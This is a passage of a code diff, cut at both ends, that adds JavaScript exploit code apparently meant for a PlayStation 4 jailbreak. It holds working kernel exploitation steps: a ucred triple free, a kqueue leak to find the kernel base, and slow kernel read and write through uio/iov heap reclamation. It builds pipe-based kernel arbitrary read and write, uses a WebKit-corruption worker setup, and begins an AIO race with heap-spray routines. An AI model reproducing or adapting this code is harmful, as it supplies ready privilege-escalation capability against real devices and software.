+        if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+          throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+        }
+      }
+
+      logger.debug("iov workers work done !!");
+
+      if (!reclaimed) {
+        throw new Error("Unable to set cr_refcnt back to 1 !!");
+      }
+
+      logger.info(`Set cr_refcnt back to 1 !!`);
+
+      // Triple free ucred.
+      uaf_sock_dup = fn.dup.invoke(uaf_sock);
+      if (uaf_sock_dup === -1) {
+        throw new SyscallError(`Unable to duplicate fd ${uaf_sock} !!`);
+      }
+
+      if (fn.close.invoke(uaf_sock_dup) === -1) {
+        throw new SyscallError(`Unable to close fd ${uaf_sock_dup} !!`);
+      }
+
+      logger.info("Looking for triplets...");
+
+      triplets[0] = twins[0];
+      triplets[1] = find_triplet(triplets[0], -1);
+
+      // Release iov spray
+      if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+        throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+      }
+
+      triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+      await Promise.all(iov_tasks);
+
+      if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+        throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+      }
+
+      logger.info(`Found triplet: ${triplets} !!`);
+
+      logger.info(`Ucred triple free achieved !!`);
+
+      break;
+    } catch (err) {
+      if (err.name === "SyscallError") {
+        throw err;
+      }
+
+      logger.info(`[${i + 1}/${NUM_ATTEMPT}] ${err.message}\n${err.stack}`);
+
+      if (i + 1 === NUM_ATTEMPT) {
+        throw new Error("Unable to ucred triple free !!");
+      }
+
+      logger.info("Reattempt...");
+
+      if (uaf_sock !== 0) {
+        if (fn.close.invoke(uaf_sock) === -1) {
+          throw new SyscallError(`Unable to close fd ${uaf_sock} !!`);
+        }
+
+        uaf_sock = 0;
+      }
+    }
+  }
+}
+
+function leak_kqueue() {
+  logger.info("Leak kqueue started...");
+
+  // Free one
+  free_rthdr(triplets[2]);
+
+  let kq;
+  let leaked = false;
+  for (let i = 0; i < NUM_LEAK_KQUEUE; i++) {
+    kq = fn.kqueue.invoke();
+    if (kq === -1) {
+      throw new SyscallError("Unable to get kqueue !!");
+    }
+
+    get_rthdr(triplets[0], KQUEUE_SIZE);
+
+    const kq_hdr = arw.view(leak_rthdr0_addr).getBInt(8, true);
+    if (kq_hdr.eq(0x1430000)) {
+      logger.debug(`Leaked kqueue after ${i} iterations !!`);
+      leaked = true;
+      break;
+    }
+
+    if (fn.close.invoke(kq) === -1) {
+      throw new SyscallError(`Unable to close fd ${kq} !!`);
+    }
+  }
+
+  if (!leaked) {
+    throw new Error("Unable to leak kqueue !!");
+  }
+
+  logger.info("Leaked kqueue !!");
+
+  kl_lock = arw.view(leak_rthdr0_addr).getBInt(0x60, true);
+  kq_fdp = arw.view(leak_rthdr0_addr).getBInt(0x98, true);
+  kernel_base = kl_lock.sub(constants.KL_LOCK);
+
+  logger.debug(`kq_fdp: ${kq_fdp}`);
+  logger.debug(`kl_lock: ${kl_lock}`);
+
+  logger.info(`kernel base: ${kernel_base}`);
+
+  // Close kqueue to free buffer
+  if (fn.close.invoke(kq) === -1) {
+    throw new SyscallError(`Unable to close fd ${kq} !!`);
+  }
+
+  triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+  logger.debug(`Found triplet: ${triplets} !!`);
+
+  logger.info("Leak kqueue completed !!");
+}
+
+async function kread_slow(addr, size) {
+  // Prepare leak buffers
+  const leak_bufs = new Array(uio_workers.length);
+  for (let i = 0; i < leak_bufs.length; i++) {
+    leak_bufs[i] = mem.alloc(size);
+  }
+
+  // Set send buf size
+  const buf_size_addr = mem.alloc(4);
+
+  arw.view(buf_size_addr).setInt32(0, size, true);
+
+  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
+  }
+
+  mem.free(buf_size_addr);
+
+  // Fill queue
+  if (fn.write.invoke(uio_ss[1], tmp, size).eq(-1)) {
+    throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
+  }
+
+  // Set iov length
+  uio_iov_read.iov_len = size;
+
+  // Free one
+  free_rthdr(triplets[2]);
+
+  logger.debug("Signaling work to uio workers...");
+
+  let reclaimed = false;
+
+  // Reclaim with uio
+  for (let i = 0; i < NUM_UIO_SPRAY; i++) {
+    for (let i = 0; i < uio_tasks.length; i++) {
+      uio_tasks[i] = uio_workers[i].execute("uio_read", uio_ss, uio_iov_read.addr);
+    }
+
+    if (fn.sched_yield.invoke() === -1) {
+      throw new SyscallError("Unable to yield scheduler !!");
+    }
+
+    // Leak with other rthdr
+    get_rthdr(triplets[0], iovec.sizeof);
+
+    const iov_len = arw.view(leak_rthdr0_addr).getInt32(8, true);
+    if (iov_len === NUM_UIO_IOV) {
+      logger.debug(`Reclaim with uio after ${i} iterations !!`);
+      reclaimed = true;
+      break;
+    }
+
+    // Wake up all workers
+    if (fn.read.invoke(uio_ss[0], tmp, size).eq(-1)) {
+      throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
+    }
+
+    for (let i = 0; i < leak_bufs.length; i++) {
+      if (fn.read.invoke(uio_ss[0], leak_bufs[i], size).eq(-1)) {
+        throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
+      }
+    }
+
+    await Promise.all(uio_tasks);
+
+    // Fill queue
+    if (fn.write.invoke(uio_ss[1], tmp, size).eq(-1)) {
+      throw new SyscallError(`Unable to write to fd ${uio_ss[1]} !!`);
+    }
+  }
+
+  logger.debug("uio workers work done !!");
+
+  if (!reclaimed) {
+    throw new Error("Unable to reclaim with uio !!");
+  }
+
+  const uio_iov = arw.view(leak_rthdr0_addr).getBInt(0, true);
+
+  // Prepare uio reclaim buffer
+  msg_uio.uio_iov = uio_iov;
+  msg_uio.uio_iovcnt = NUM_UIO_IOV;
+  msg_uio.uio_offset = -1;
+  msg_uio.uio_resid = uio_iov_read.iov_len;
+  msg_uio.uio_segflg = UIO_SYSSPACE;
+  msg_uio.uio_rw = UIO_WRITE;
+  msg_uio.uio_td = 0;
+
+  msg_iov[3].iov_base = addr;
+  msg_iov[3].iov_len = uio_iov_read.iov_len;
+
+  // Free second one
+  free_rthdr(triplets[1]);
+
+  logger.debug("Signaling work to iov workers...");
+
+  reclaimed = false;
+
+  // Reclaim uio with iov
+  for (let i = 0; i < NUM_IOV_SPRAY; i++) {
+    // Reclaim with iov
+    for (let i = 0; i < iov_tasks.length; i++) {
+      iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
+    }
+
+    if (fn.sched_yield.invoke() === -1) {
+      throw new SyscallError("Unable to yield scheduler !!");
+    }
+
+    // Leak with other rthdr
+    get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);
+
+    const uio_segflg = arw.view(leak_rthdr0_addr).getInt32(0x20, true);
+    if (uio_segflg === UIO_SYSSPACE) {
+      logger.debug(`Reclaim uio with iov after ${i} iterations !!`);
+      reclaimed = true;
+      break;
+    }
+
+    // Release iov spray
+    if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+      throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+    }
+
+    await Promise.all(iov_tasks);
+
+    if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+      throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+    }
+  }
+
+  logger.debug("iov workers work done !!");
+
+  if (!reclaimed) {
+    throw new Error("Unable to reclaim uio with iov !!");
+  }
+
+  // Wake up all workers
+  if (fn.read.invoke(uio_ss[0], tmp, size).eq(-1)) {
+    throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
+  }
+
+  // Read the results now
+  let leak_buf;
+
+  // Get leak
+  const spray_val = new BInt("0x4141414141414141");
+  for (let i = 0; i < leak_bufs.length; i++) {
+    if (fn.read.invoke(uio_ss[0], leak_bufs[i], size).eq(-1)) {
+      throw new SyscallError(`Unable to read from fd ${uio_ss[0]} !!`);
+    }
+
+    const val = arw.view(leak_bufs[i]).getBInt(0, true);
+    if (val.neq(spray_val)) {
+      triplets[1] = find_triplet(triplets[0], -1);
+
+      leak_buf = leak_bufs[i];
+      continue;
+    }
+
+    mem.free(leak_bufs[i]);
+  }
+
+  await Promise.all(uio_tasks);
+
+  // Release iov spray
+  if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+  }
+
+  triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+  await Promise.all(iov_tasks);
+
+  if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+  }
+
+  logger.debug(`Found triplet: ${triplets} !!`);
+
+  if (typeof leak_buf === "undefined") {
+    throw new Error(`Unable to kread ${addr} !!`);
+  }
+
+  return leak_buf;
+}
+
+async function kwrite_slow(dst, src, size) {
+  // Set send buf size
+  const buf_size_addr = mem.alloc(4);
+
+  arw.view(buf_size_addr).setInt32(0, size, true);
+
+  if (fn.setsockopt.invoke(uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
+    throw new SyscallError(`Unable to set socket option for fd ${uio_ss[1]} !!`);
+  }
+
+  mem.free(buf_size_addr);
+
+  // Set iov length
+  uio_iov_write.iov_len = size;
+
+  // Free one
+  free_rthdr(triplets[2]);
+
+  logger.debug("Signaling work to uio workers...");
+
+  let reclaimed = false;
+
+  // Reclaim with uio
+  for (let i = 0; i < NUM_UIO_SPRAY; i++) {
+    for (let i = 0; i < uio_tasks.length; i++) {
+      uio_tasks[i] = uio_workers[i].execute("uio_write", uio_ss, uio_iov_write.addr);
+    }
+
+    if (fn.sched_yield.invoke() === -1) {
+      throw new SyscallError("Unable to yield scheduler !!");
+    }
+
+    // Leak with other rthdr
+    get_rthdr(triplets[0], iovec.sizeof);
+
+    const iov_len = arw.view(leak_rthdr0_addr).getInt32(8, true);
+    if (iov_len === NUM_UIO_IOV) {
+      logger.debug(`Reclaim with uio after ${i} iterations !!`);
+      reclaimed = true;
+      break;
+    }
+
+    // Wake up all workers
+    for (let i = 0; i < uio_workers.length; i++) {
+      if (fn.write.invoke(uio_ss[1], src, size).eq(-1)) {
+        throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
+      }
+    }
+
+    await Promise.all(uio_tasks);
+  }
+
+  logger.debug("uio workers work done !!");
+
+  if (!reclaimed) {
+    throw new Error("Unable to reclaim with uio !!");
+  }
+
+  const uio_iov = arw.view(leak_rthdr0_addr).getBInt(0, true);
+
+  // Prepare uio reclaim buffer
+  msg_uio.uio_iov = uio_iov;
+  msg_uio.uio_iovcnt = NUM_UIO_IOV;
+  msg_uio.uio_offset = -1;
+  msg_uio.uio_resid = uio_iov_write.iov_len;
+  msg_uio.uio_segflg = UIO_SYSSPACE;
+  msg_uio.uio_rw = UIO_READ;
+  msg_uio.uio_td = 0;
+
+  msg_iov[3].iov_base = dst;
+  msg_iov[3].iov_len = uio_iov_write.iov_len;
+
+  // Free second one
+  free_rthdr(triplets[1]);
+
+  logger.debug("Signaling work to iov workers...");
+
+  reclaimed = false;
+
+  // Reclaim uio with iov
+  for (let i = 0; i < NUM_IOV_SPRAY; i++) {
+    // Reclaim with iov
+    for (let i = 0; i < iov_tasks.length; i++) {
+      iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
+    }
+
+    if (fn.sched_yield.invoke() === -1) {
+      throw new SyscallError("Unable to yield scheduler !!");
+    }
+
+    // Leak with other rthdr
+    get_rthdr(triplets[0], uio.sizeof + iovec.sizeof);
+
+    const uio_segflg = arw.view(leak_rthdr0_addr).getInt32(0x20, true);
+    if (uio_segflg === UIO_SYSSPACE) {
+      logger.debug(`Reclaim uio with iov after ${i} iterations !!`);
+      reclaimed = true;
+      break;
+    }
+
+    // Release iov spray
+    if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+      throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+    }
+
+    await Promise.all(iov_tasks);
+
+    if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+      throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+    }
+  }
+
+  logger.debug("iov workers work done !!");
+
+  if (!reclaimed) {
+    throw new Error("Unable to reclaim uio with iov !!");
+  }
+
+  // Corrupt data
+  for (let i = 0; i < uio_workers.length; i++) {
+    if (fn.write.invoke(uio_ss[1], src, size).eq(-1)) {
+      throw new SyscallError(`Unable to read from fd ${uio_ss[1]} !!`);
+    }
+  }
+
+  triplets[1] = find_triplet(triplets[0], -1);
+
+  await Promise.all(uio_tasks);
+
+  // Release iov spray
+  if (fn.write.invoke(iov_ss[1], tmp, 1).eq(-1)) {
+    throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
+  }
+
+  triplets[2] = find_triplet(triplets[0], triplets[1]);
+
+  await Promise.all(iov_tasks);
+
+  if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
+    throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
+  }
+
+  logger.debug(`Found triplet: ${triplets} !!`);
+}
+
+async function kread8_slow(addr) {
+  const leak_buf = await kread_slow(addr, 8);
+  return arw.view(leak_buf).getBInt(0, true);
+}
+
+function remove_uaf_file() {
+  const uaf_fp = fget(uaf_sock);
+  logger.debug(`uaf_fp: ${uaf_fp}`);
+
+  // Remove uaf sock
+  fput(uaf_sock, 0);
+  uaf_sock = 0;
+
+  let removed = 0;
+  // Remove triple freed file from uaf sock
+  for (let i = 0; i < 0x100; i++) {
+    const sock = make_socket(AF_UNIX, SOCK_STREAM);
+
+    if (fget(sock).eq(uaf_fp)) {
+      logger.debug(`reclaimed uaf fp with fd ${sock}, removing...`);
+      fput(sock, 0);
+      removed++;
+    }
+
+    fn.close.invoke(sock);
+
+    if (removed === 3) {
+      logger.info(`cleaned up uaf fp after ${i} iterations !!`);
+      break;
+    }
+  }
+}
+
+async function make_karw() {
+  logger.info("Initiate kernel ARW...");
+
+  fdt_ofiles = await kread8_slow(kq_fdp);
+  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);
+
+  const master_pipe_fp = await kread8_slow(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE));
+  logger.debug(`master_pipe_fp: ${master_pipe_fp}`);
+
+  const slave_pipe_fp = await kread8_slow(fdt_ofiles.add(slave_pipe[0] * FILEDESCENT_SIZE));
+  logger.debug(`slave_pipe_fp: ${slave_pipe_fp}`);
+
+  const master_pipe_f_data = await kread8_slow(master_pipe_fp);
+  logger.debug(`master_pipe_f_data: ${master_pipe_f_data}`);
+
+  const slave_pipe_f_data = await kread8_slow(slave_pipe_fp);
+  logger.debug(`slave_pipe_f_data: ${slave_pipe_f_data}`);
+
+  const pipe_buf = pipebuf.new();
+
+  pipe_buf.cnt = 0;
+  pipe_buf.in = 0;
+  pipe_buf.out = 0;
+  pipe_buf.size = PAGE_SIZE;
+  pipe_buf.buffer = slave_pipe_f_data;
+
+  await kwrite_slow(master_pipe_f_data, pipe_buf.addr, pipebuf.sizeof);
+
+  mem.free(pipe_buf.addr);
+
+  kv = new KernelView(master_pipe, slave_pipe);
+
+  logger.info("Achieved kernel ARW !!");
+}
+//#endregion
+//#region Structs
+const iovec = new Struct("iovec", [
+  { type: "Uint64", name: "iov_base" },
+  { type: "Uint64", name: "iov_len" },
+]);
+
+const msghdr = new Struct("msghdr", [
+  { type: "Uint64", name: "msg_name" },
+  { type: "Uint32", name: "msg_namelen" },
+  { type: "iovec*", name: "msg_iov" },
+  { type: "Int32", name: "msg_iovlen" },
+  { type: "Uint64", name: "msg_control" },
+  { type: "Uint32", name: "msg_controllen" },
+  { type: "Int32", name: "msg_flags" },
+]);
+
+const uio = new Struct("uio", [
+  { type: "Uint64", name: "uio_iov" },
+  { type: "Uint32", name: "uio_iovcnt" },
+  { type: "Uint64", name: "uio_offset" },
+  { type: "Uint64", name: "uio_resid" },
+  { type: "Uint32", name: "uio_segflg" },
+  { type: "Uint32", name: "uio_rw" },
+  { type: "Uint64", name: "uio_td" },
+]);
+//#endregion
+
+importScripts("misc.js");
+
+let marker_arr = new Uint32Array(new ArrayBuffer(0x10));
+
+const transfer = [];
+const api = {
+  init(name) {
+    self.name = name;
+
+    version.init();
+    switch (version.console) {
+      case 4:
+        importScripts("ps4/constants.js", "ps4/userland.js");
+        break;
+      case 5:
+        //TODO
+        break;
+      default:
+        throw new Error(`Unsupported console ${version.console}`);
+    }
+
+    arw.master = new Uint32Array(6);
+
+    marker_arr.fill(0x41414141);
+    marker_arr.leak = arw.leak;
+    marker_arr.master = arw.master;
+    marker_arr.victim = arw.victim;
+
+    transfer.push(marker_arr.buffer);
+
+    return marker_arr;
+  },
+  setup(leak_addr, wk_base) {
+    transfer.length = 0;
+
+    marker_arr = null;
+
+    arw.leak_addr = new BInt(leak_addr);
+    webkit_base = new BInt(wk_base);
+
+    init_arw();
+    init_rop();
+    init_syscalls();
+
+    return true;
+  },
+  register(name, fn) {
+    if (typeof fn !== "string") {
+      throw new Error(`${fn} not a string !!`);
+    }
+
+    if (name in api) {
+      throw new Error(`${name} already registered !!`);
+    }
+
+    api[name] = new Function(`return (${fn})`)();
+
+    return true;
+  },
+  ping() {
+    return "pong";
+  },
+};
+
+self.onmessage = async (e) => {
+  const { id, name, args = [] } = e.data || {};
+
+  try {
+    const fn = api[name];
+
+    if (typeof fn !== "function") {
+      throw new Error(`Unknown function ${name} !!`);
+    }
+
+    const ret = await fn(...args);
+
+    self.postMessage({ id, type: "ret", value: ret }, transfer);
+  } catch (err) {
+    self.postMessage({ id, type: "err", value: err });
+  }
+};
+
+//#region Classes
+class RPCWorker {
+  constructor(name) {
+    if (typeof name !== "string") {
+      throw new Error(`${name} not a valid name !!`);
+    }
+
+    this.id = 0;
+    this.name = name;
+    this.transfer = [];
+    this.promises = new Map();
+    this.worker = new Worker("src/worker.js");
+
+    this.worker.onmessage = (e) => {
+      const { id, type, value } = e.data || {};
+
+      if (type === "log") {
+        logger.log(value);
+        return;
+      }
+
+      const promise = this.promises.get(id);
+      if (!promise) return;
+
+      this.promises.delete(id);
+
+      switch (type) {
+        case "ret":
+          promise.resolve(value);
+          break;
+        case "err":
+          promise.reject(value);
+          break;
+      }
+    };
+  }
+
+  terminate() {
+    this.worker.terminate();
+  }
+
+  execute(name, ...args) {
+    return new Promise((resolve, reject) => {
+      const id = this.id++;
+
+      this.promises.set(id, { resolve, reject });
+
+      this.worker.postMessage({ id, name, args }, this.transfer);
+    });
+  }
+
+  async init() {
+    logger.debug(`initializing ${this.name}...`);
+
+    const marker_arr = await this.execute("init", this.name);
+
+    const marker_buf_data = marker_arr.buffer.data();
+    logger.debug(`marker_buf_data: ${marker_buf_data}`);
+
+    const marker_storage_addr = arw.view(marker_buf_data).getBInt(constants.marker_storage, true);
+    logger.debug(`marker_storage_addr: ${marker_storage_addr}`);
+
+    const marker_addr = arw.view(marker_storage_addr).getBInt(8, true);
+    logger.debug(`marker_addr: ${marker_addr}`);
+
+    const marker_butterfly_addr = arw.view(marker_addr).getBInt(8, true);
+    logger.debug(`marker_butterfly_addr: ${marker_butterfly_addr}`);
+
+    const marker_butterfly_prop_addr = marker_butterfly_addr.sub(0x20);
+    logger.debug(`marker_butterfly_prop_addr: ${marker_butterfly_prop_addr}`);
+
+    const victim_addr = arw.view(marker_butterfly_prop_addr).getBInt(0, true);
+    logger.debug(`victim_addr: ${victim_addr}`);
+
+    const master_addr = arw.view(marker_butterfly_prop_addr).getBInt(8, true);
+    logger.debug(`master_addr: ${master_addr}`);
+
+    const leak_addr = arw.view(marker_butterfly_prop_addr).getBInt(0x10, true);
+    logger.debug(`leak_addr: ${leak_addr}`);
+
+    arw.view(master_addr).setBInt(0x10, victim_addr, true);
+
+    await this.execute("setup", leak_addr, webkit_base);
+
+    logger.debug(`${this.name} initialized !!`);
+  }
+}
+//#endregion
+
+//#region Variables
+const NUM_REQS = 3; // 0x80 kmalloc zone since SceKernelAioRWRequest.sizeof * 3 = 0x78
+const WORKER_NUM = 2;
+const SPRAY_NUM = 0x200;
+const ATTEMPT_NUM = 0x80;
+const HANDLES_NUM = 0x100;
+const IPV6_SOCK_NUM = 0x80;
+//#endregion
+//#region Contants
+const SCE_KERNEL_ERROR_ESRCH = 0x80020003;
+
+const COMMAND_AIO_DELETE = 0;
+
+const AIO_OP_CANCEL = 1;
+const AIO_OP_WAIT = 2;
+const AIO_OP_POLL = 4;
+const AIO_OP_DELETE = 8;
+
+const AIO_WAIT_AND = 1;
+const AIO_CMD_READ = 1;
+const AIO_CMD_WRITE = 2;
+const AIO_CMD_MULTI = 0x1000;
+const AIO_PRIORITY_HIGH = 3;
+const AIO_STATE_COMPLETE = 3;
+const AIO_STATE_ABORTED = 4;
+const AIO_MAX_NUM = 0x80;
+
+const block_ss = new Array(2);
+const rthdr_twins = new Array(2);
+const pktopts_twins = new Array(2);
+const ipv6_socks = new Array(IPV6_SOCK_NUM);
+const spray_ids = new Uint32Array(SPRAY_NUM);
+const outs = new Uint32Array(AIO_MAX_NUM);
+
+let reqs1 = undefined;
+let block_id = undefined;
+
+let race_worker = undefined;
+
+let evf = undefined;
+let evf_cv_addr = undefined;
+let reqs1_addr = undefined;
+let reqs2_addr = undefined;
+let aio_info_addr = undefined;
+let target_id = undefined;
+
+fn.accept = new NativeFunction(0x1e, "number");
+fn.getsockname = new NativeFunction(0x20, "number");
+fn.connect = new NativeFunction(0x62, "number");
+fn.bind = new NativeFunction(0x68, "number");
+fn.listen = new NativeFunction(0x6a, "number");
+fn.socketpair = new NativeFunction(0x87, "number");
+fn.evf_create = new NativeFunction(0x21a, "number");
+fn.evf_delete = new NativeFunction(0x21b, "number");
+fn.evf_set = new NativeFunction(0x220, "number");
+fn.evf_clear = new NativeFunction(0x221, "number");
+fn.aio_multi_delete = new NativeFunction(0x296, "number");
+fn.aio_multi_wait = new NativeFunction(0x297, "number");
+fn.aio_multi_poll = new NativeFunction(0x298, "number");
+fn.aio_multi_cancel = new NativeFunction(0x29a, "number");
+fn.aio_submit_cmd = new NativeFunction(0x29d, "number");
+//#endregion
+//#region Functions
+function build_reqs1(count, fd = -1) {
+  mem.bset(reqs1.addr, SceKernelAioRWRequest.sizeof * AIO_MAX_NUM);
+  for (let i = 0; i < count; i++) {
+    reqs1[i].nbyte = fd === -1 ? 0 : 1;
+    reqs1[i].fd = fd;
+  }
+}
+
+function spray_aio(cmd, num_reqs, ids, count = ids.length) {
+  const step = cmd & AIO_CMD_MULTI ? num_reqs : 1;
+  count = cmd & AIO_CMD_MULTI ? count / step : count;
+
+  const ids_addr = ids.buffer.data();
+  const total = count * step;
+
+  for (let i = 0; i < total; i += step) {
+    const ids_offset_addr = ids_addr.add(i * Uint32Array.BYTES_PER_ELEMENT);
+
+    fn.aio_submit_cmd.invoke(cmd, reqs1.addr, num_reqs, AIO_PRIORITY_HIGH, ids_offset_addr);
+  }
+}
+
+function process_aio(op, ids, offset = 0, count = ids.length - offset) {
+  const ids_addr = ids.buffer.data();
+  const outs_addr = outs.buffer.data();
+
+  while (count > 0) {
+    const step = Math.min(count, AIO_MAX_NUM);
+
+    const ids_offset_addr = ids_addr.add(offset * Uint32Array.BYTES_PER_ELEMENT);
+
+    if (op & AIO_OP_CANCEL) {
+      fn.aio_multi_cancel.invoke(ids_offset_addr, step, outs_addr);
+    }
+
+    if (op & AIO_OP_WAIT) {
+      fn.aio_multi_wait.invoke(ids_offset_addr, step, outs_addr, AIO_WAIT_AND, 0);
+    }
+
+    if (op & AIO_OP_POLL) {
+      fn.aio_multi_poll.invoke(ids_offset_addr, step, outs_addr);
+    }
+
+    if (op & AIO_OP_DELETE) {
+      fn.aio_multi_delete.invoke(ids_offset_addr, step, outs_addr);
+    }
+
+    count -= step;
+    offset += step;
+  }
+}
+
+async function spawn_race_worker() {
+  logger.debug("spawn race worker...");
+
+  // Prepare worker
+  race_worker = new RPCWorker(`race_worker`);
+  await race_worker.init();
+  await race_worker.execute(
+    "register",
+    "kinit",
+    `() => {
+      switch (version.console) {
+        case 4:
+          importScripts("ps4/kernel.js");
+          break;
+        case 5:
+          //TODO
+          break;
+        default:
+          logger.info(\`Unsupported console \${version.console}\`);
+      }
+
+      pin_to_core(MAIN_CORE);
+      set_rtprio(RTP);
+
+      fn.aio_multi_delete = new NativeFunction(0x296, "number");
+
+      return true;
+    }`,
+  );
+  await race_worker.execute(
+    "register",
+    "aio_delete",
+    `(ids_addr, outs_addr) => {
+      ids_addr = new BInt(ids_addr);
+      outs_addr = new BInt(outs_addr);
+
+      fn.aio_multi_delete.invoke(ids_addr, 1, outs_addr);
+      
+      return true;
+    }`,
+  );
+
+  await race_worker.execute("kinit");
+
+  logger.debug("race worker spawned !!");
+}
+
+function stop_race_worker() {
+  if (race_worker !== undefined) {
+    logger.debug("terminate race worker...");
+
+    race_worker.terminate();
+    race_worker = undefined;
+
+    logger.debug("race worker terminated !!");
+  }
+}
+
+function verify_reqs2(aio_entry) {
+  // heap addresses are prefixed with 0xffff_xxxx
+  // xxxx is randomized on boot
+  //
+  // heap_prefixes is a array of randomized prefix bits from a group of heap
+  // address candidates. if the candidates truly are from the heap, they must
+  // share a common prefix
+  const heap_prefixes = [];
+  const verify_prefix = (v) => {
+    if (v.shr(0x30).neq(0xffff)) {
+      throw new Error(`${v} not a kernel pointer !!`);
+    }
+
+    heap_prefixes.push(v.shr(0x20).and(0xffff));
+  };
+
+  try {
+    if (aio_entry.ar2_cmd !== AIO_CMD_WRITE) {
+      return false;
+    }
+
+    verify_prefix(aio_entry.ar2_reqs1);
+    verify_prefix(aio_entry.ar2_info);
+    verify_prefix(aio_entry.ar2_batch);
+
+    // check reqs2.ar2_result.state
+    // state is actually a 32-bit value but the allocated memory was
+    // initialized with zeros. all padding bytes must be 0 then
+    if (aio_entry.ar2_result.state <= 0 || aio_entry.ar2_result.state > AIO_STATE_ABORTED) {
+      return false;
+    }
+
+    if (aio_entry.ar2_result._pad !== 0) {
+      return false;
+    }
+
+    // reqs2.ar2_file must be NULL since we passed a bad file descriptor to
+    // aio_submit_cmd()
+    if (aio_entry.ar2_file.neq(0)) {
+      return false;
+    }
+
+    // aio_entry._unk2 can be NULL
+    if (aio_entry._unk2.neq(0)) {
+      verify_prefix(aio_entry._unk2);
+    }
+
+    verify_prefix(aio_entry.ar2_qentry);
+
+    return heap_prefixes.every((v, _, a) => v.eq(a[0]));
+  } catch {
+    return false;
+  }
+}
+
+function find_rthdr_twins() {
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      arw.view(spray_rthdr0_addr).setInt32(4, i, true); // ip6_rthdr0.ip6r0_reserved
+
+      set_rthdr(ipv6_socks[i]);
+    }
+
+    for (let j = 0; j < ipv6_socks.length; j++) {
+      get_rthdr(ipv6_socks[j], ip6_rthdr0.sizeof);
+
+      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true); // ip6_rthdr0.ip6r0_reserved
+      if (idx !== j) {
+        logger.debug(`Found rthdr twins after ${i} iterations !!`);
+
+        rthdr_twins[0] = ipv6_socks[j];
+        rthdr_twins[1] = ipv6_socks[idx];
+
+        const max = Math.max(j, idx);
+        const min = Math.min(j, idx);
+
+        // remove twins from list
+        ipv6_socks.splice(max, 1);
+        ipv6_socks.splice(min, 1);
+
+        // free rthdr from rest of sockets
+        for (const sock of ipv6_socks) {
+          free_rthdr(sock);
+        }
+
+        // replace twins with new sockets
+        ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM), make_socket(AF_INET6, SOCK_DGRAM));
+
+        return;
+      }
+    }
+  }
+
+  throw new Error("Unable to find rthdr twins !!");
+}
+
+function make_pktopts_twins() {
+  const tclass_addr = mem.alloc(4);
+  const tclass_len_addr = mem.alloc(4);
+
+  let overwritten = false;
+  for (let i = 0; i < ATTEMPT_NUM; i++) {
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      if (fn.setsockopt.invoke(ipv6_socks[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0) === -1) {
+        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[i]} !!`);
+      }
+    }
+
+    for (let i = 0; i < ipv6_socks.length; i++) {
+      arw.view(tclass_addr).setInt32(0, i, true);
+
+      if (fn.setsockopt.invoke(ipv6_socks[i], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4) === -1) {
+        throw new SyscallError(`Unable to set socket option for fd ${ipv6_socks[i]} !!`);
+      }
+    }
+
+    for (let j = 0; j < ipv6_socks.length; j++) {
+      arw.view(tclass_len_addr).setInt32(0, 4, true);
+
+      if (fn.getsockopt.invoke(ipv6_socks[j], IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, tclass_len_addr) === -1) {
+        throw new SyscallError(`Unable to get socket option for fd ${ipv6_socks[j]} !!`);
+      }
+
+      const idx = arw.view(tclass_addr).getInt32(0, true);
+      if (idx !== j) {
+        pktopts_twins[0] = ipv6_socks[j];
+        pktopts_twins[1] = ipv6_socks[idx];
+
+        const max = Math.max(j, idx);
+        const min = Math.min(j, idx);
+
+        // remove twins from list
+        ipv6_socks.splice(max, 1);
+        ipv6_socks.splice(min, 1);
+
+        // replace twins with new sockets, and add pktopts now while new allocs can't
+        // use the double freed memory
+        for (let k = 0; k < pktopts_twins.length; k++) {
+          const sock = make_socket(AF_INET6, SOCK_DGRAM);
+
